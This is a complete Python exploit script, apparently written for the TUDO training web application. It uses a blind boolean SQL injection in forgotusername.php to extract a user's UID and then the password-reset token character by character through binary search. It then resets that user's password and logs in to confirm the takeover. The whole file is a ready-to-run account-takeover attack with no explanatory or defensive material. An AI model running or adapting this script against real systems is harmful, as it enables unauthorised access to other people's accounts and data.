import requests
import sys
from typing import Optional

class TUDOExploit:
    def __init__(self, target: str):
        self.target = target
        self.username = "user1"
        self.new_password = "test"
        self.base_url = f"http://{target}"
        self.session = requests.Session()

    def request_reset(self, username: str) -> bool:
        """Request password reset for a username"""
        url = f"{self.base_url}/forgotpassword.php"
        data = {'username': username}

        try:
            response = self.session.post(url, data=data, timeout=10)
            return 'Email sent!' in response.text
        except requests.RequestException as e:
            print(f"[-] Error requesting reset: {e}")
            return False
        
    def oracle(self, q_left: str, q_op: str, q_right: str) -> bool:
        """SQL injection oracle to test conditions"""
        url = f"{self.base_url}/forgotusername.php"
        payload = f"admin' and {q_left}{q_op}{q_right}"
        data = {'username': payload}

        try:
            response = self.session.post(url, data=data, timeout=10)
            # print(f"[DEBUG] Oracle query: {payload}")
            # print(f"[DEBUG] Response: {response.text[:100]}...")
            return 'User exists!' in response.text
        except requests.RequestException as e:
            print(f"[-] Oracle error: {e}")
            return False
        
    def change_password(self, token: str) -> bool:
        url = f"{self.base_url}/resetpassword.php"
        data = {
            'token': token,
            'password1': self.new_password,
            'password2': self.new_password
        }

        try:
            response = self.session.post(url, data=data, timeout=10)
            return 'Password changed!' in response.text
        except requests.RequestException as e:
            print(f"[-] Error changing password: {e}")
            return False
        
    def test_vulnerability(self) -> bool:
        """Test if target is vulnerable"""
        true_test = self.oracle("1", "=", "'1")
        false_test = self.oracle("0", "=", "'1")

        return true_test and not false_test
    
    def dump_uid(self) -> Optional[int]:
        """Dump the UID for the target username"""
        sql_template = "(select uid from users where username='{}')"
        uid = 0

        while uid < 1000:
            if self.oracle(sql_template.format(self.username), "=", f"'{uid}"):
                return uid
            uid += 1

        print("[-] Failed to dump UID")
        return None
    
    def dump_token(self, uid: int) -> Optional[str]:
        """Dump the reset token using binary search"""
        dumped = ""
        sql_template = "(select ascii(substr(token, {}, 1)) from tokens where uid={} limit 1)"

        for i in range(1, 33):
            char_found = self._binary_search_char(i, uid, sql_template)
            if char_found is None:
                print(f"[-] Failed to dump character at position {i}")
                return None
            dumped += char_found

        return dumped
    
    def _binary_search_char(self, position: int, uid: int, sql_template: str) -> Optional[str]:
        """Binary search for a single character"""
        low, high = 32, 127

        while low <= high:
            mid = (high + low) // 2

            # Test greater than
            if self.oracle(sql_template.format(position, uid), ">", f"'{mid}"):
                low = mid + 1
            elif self.oracle(sql_template.format(position, uid), "<", f"'{mid}"):
                high = mid - 1
            # Found exact match
            else:
                return chr(mid)
            
        return None
    
    def login(self, username: str, password: str) -> bool:
        """Attempt to login with the new credentials"""
        url = f"{self.base_url}/login.php"
        data = {
            'username': username,
            'password': password
        }

        try:
            print(f"[+] Attempting login with: {username}:{password}")
            response = self.session.post(url, data=data, timeout=10)
            
            # Check for successful login indicators
            success_indicators = [
                'Welcome',
                'Hello',
                'Logout'
            ]

            # Check if any success indicator is in the response
            login_success = any(indicator in response.text for indicator in success_indicators)

            if login_success:
                print(f"[+] Login successful! {response.text[:200]}...")
                return True
            else:
                print(f"[-] Login failed. Response: {response.text[:200]}...")
                return False
            
        except requests.RequestException as e:
            print(f"[-] Login error: {e}")
            return False

    
    def execute(self) -> bool:
        """Execute the complete exploit chain"""
        print(f"[+] Testing vulnerability for target: {self.target}")

        if not self.test_vulnerability():
            print("[-] Target is not vulnerable")
            return False
        print("[+] Target is vulnerable")

        print(f"[+] Requesting password reset for: {self.username}")
        if not self.request_reset(self.username):
            print("[-] Failed to request password reset")
            return False
        print("[+] Reset token created")

        print("[+] Dumping UID...")
        uid = self.dump_uid()
        if uid is None:
            return False
        print(f"[+] UID dumped: {uid}")
        
        print("[+] Dumping token...")
        token = self.dump_token(uid)
        if token is None:
            return False
        print(f"[+] Token dumped: {token}")

        print("[+] Changing password...")
        if not self.change_password(token):
            print("[-] Failed to change password")
            return False
        
        print(f"[+] Success! Password changed to: {self.new_password}")
    
        # Test login with new credentials
        print("[+] Testing login with new credentials...")
        if self.login(self.username, self.new_password):
            print(f"[+] SUCCESS! Successfully logged in as {self.username} with password {self.new_password}")
            return True
        else:
            print(f"[-] WARNING: Password changed but login failed. Check if the login endpoint is correct.")
            return False
    
def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <TargetIP>")
        sys.exit(1)

    target = sys.argv[1]


    exploit = TUDOExploit(target)

    if not exploit.execute():
        sys.exit(1)

if __name__ == "__main__":
    main()